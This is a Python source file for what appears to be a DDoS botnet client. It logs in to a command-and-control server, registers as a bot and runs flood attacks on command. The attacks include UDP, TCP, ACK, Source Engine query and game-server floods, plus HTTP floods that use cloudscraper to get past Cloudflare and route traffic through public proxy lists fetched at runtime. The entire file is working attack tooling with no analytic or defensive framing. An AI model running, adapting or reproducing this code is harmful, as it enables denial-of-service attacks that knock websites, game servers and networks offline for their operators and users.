import socket, threading, time, random, cloudscraper, requests, struct, fake_useragent, os
from multiprocessing import Process
    
# IP and PORT C2
C2_ADDRESS  = "localhost"
C2_PORT     = 5511

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
]

def rand_ua():
    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())

def remove_by_value(arr, val):
    return [item for item in arr if item != val]

def run(target, proxies, cfbp):
    if cfbp == 0 and len(proxies) > 0:
        proxy = random.choice(proxies)
        proxiedRequest = requests.Session()
        proxiedRequest.proxies = {'http': 'http://' + proxy}
        headers = {'User-Agent': rand_ua()}
        
        try:
            response = proxiedRequest.get(target, headers=headers)

            if response.status_code >= 200 and response.status_code <= 226:
                for _ in range(100):
                    proxiedRequest.get(target, headers=headers)
            
            else:
                proxies = remove_by_value(proxies, proxy)
        
        except requests.RequestException as e:
            #print("Request Exception:", e)
            proxies = remove_by_value(proxies, proxy)

    elif cfbp == 1 and len(proxies) > 0:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        
        proxy = random.choice(proxies)
        proxies = {'http': 'http://' + proxy}

        try:
            a = scraper.get(target, headers=headers, proxies=proxies, timeout=15)

            if a.status_code >= 200 and a.status_code <= 226:
                for _ in range(100):
                    scraper.get(target, headers=headers, proxies=proxies, timeout=15)
            else:
                proxies = remove_by_value(proxies, proxy)
        
        except requests.RequestException as e:
            #print("Request Exception:", e)
            proxies = remove_by_value(proxies, proxy)
    
    else:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()

        try:
            a = scraper.get(target, headers=headers, timeout=15)
            #print("[%s%s%s] Cloudflare BYPASS"%(Y,a.status_code,C))
        except:
            pass

def thread(target, proxies, cfbp):
    while True:
        run(target, proxies, cfbp)
        time.sleep(1)

def iostresser(target, times, threads, attack_type):
    proxies = []
    if attack_type == 'PROXY' or attack_type == 'proxy':
        cfbp = 0
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            proxies += proxy_list_http.text.replace('\r', '').split('\n')
            proxies += raw_github_http.text.replace('\r', '').split('\n')
        except:
            pass

    elif attack_type == 'NORMAL' or attack_type == 'normal':
        cfbp = 1
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            proxies += proxy_list_http.text.replace('\r', '').split('\n')
            proxies += raw_github_http.text.replace('\r', '').split('\n')
        except:
            pass
    
    processes = []
    for _ in range(threads):
        p = Process(target=thread, args=(target, proxies, cfbp))
        processes.append(p)
        p.start()
    time.sleep(times)
    
    for p in processes:
        os.kill(p.pid, 9)

def CFB(url, port, secs):
    url = url + ":" + port
    while time.time() < secs:

        random_list = random.choice(("FakeUser", "User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': rand_ua()}
        else:
            headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        for _ in range(1500):
            scraper.get(url, headers=headers, timeout=15)
            scraper.head(url, headers=headers, timeout=15)

def STORM_attack(ip, port, secs):
    ip = ip + ":" + port
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    while time.time() < secs:

        random_list = random.choice(("FakeUser", "User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': rand_ua()}
        else:
            headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            requests.get(ip, headers=headers)
            requests.head(ip, headers=headers)
            scraper.get(ip, headers=headers)

def GET_attack(ip, port, secs):
    ip = ip + ":" + port
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    while time.time() < secs:
        headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            requests.get(ip, headers=headers)
            scraper.get(ip, headers=headers)

def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport))

def attack_tcp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(random._urandom(size))
        except:
            pass

def attack_ack(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            ack = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, 0b01010000, 0b00000010, 0, 0, 0)
            s.send(ack)
        except:
            s.close()

def attack_tup(ip, port, secs, size):
    while time.time() < secs:
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dport = random.randint(1, 65535) if port == 0 else port
        try:
            data = random._urandom(size)
            tcp.connect((ip, port))
            udp.sendto(data, (ip, dport))
            tcp.send(data)
        except:
            pass

def attack_hex(ip, port, secs):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_vse(ip, port, secs):
    payload = b'\xff\xff\xff\xffTSource Engine Query\x00' # Read more here > https://developer.valvesoftware.com/wiki/Server_queries
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_roblox(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(size)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            ran = random.randrange(10 ** 80)
            hex = "%064x" % ran
            hex = hex[:64]
            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))

def attack_junk(ip, port, secs):
    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def main():
        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        while 1:
            try:
                c2.connect((C2_ADDRESS, C2_PORT))
                while 1:
                    c2.send('669787761736865726500'.encode())
                    break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Username' in data:
                        c2.send('BOT'.encode())
                        break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Password' in data:
                        c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                        break
                break
            except:
                time.sleep(5)
        while 1:
            try:
                data = c2.recv(1024).decode().strip()
                if not data:
                    break
                args = data.split(' ')
                command = args[0].upper()

                if command == '.UDP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.TCP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.TUP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tup, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.HEX':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.ROBLOX':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        size = int(args[4])
                        threads = int(args[5])

                        for _ in range(threads):
                            threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.VSE':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.JUNK':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.ACK':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_ack, args=(ip, port, secs), daemon=True).start()
                
                elif command == ".HTTPSTORM":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        threading.Thread(target=STORM_attack, args=(url, port, secs), daemon=True).start()

                elif command == ".HTTPGET":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        threading.Thread(target=GET_attack, args=(url,port,secs), daemon=True).start()
                
                elif command == ".HTTPCFB":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        threading.Thread(target=CFB, args=(url,port,secs), daemon=True).start()

                elif command == ".IOSTRESSER":
                    url = args[1]
                    secs = int(args[2])
                    threads = int(args[3])
                    attackType = args[4]
                    #threads = int(args[5])
                    
                    threading.Thread(target=iostresser, args=(url, secs, threads, attackType), daemon=True).start()
                
                elif command == 'PING':
                    c2.send('PONG'.encode())

            except:
                break

        c2.close()

        main()

if __name__ == '__main__':
        try:
            main()
        except:
            pass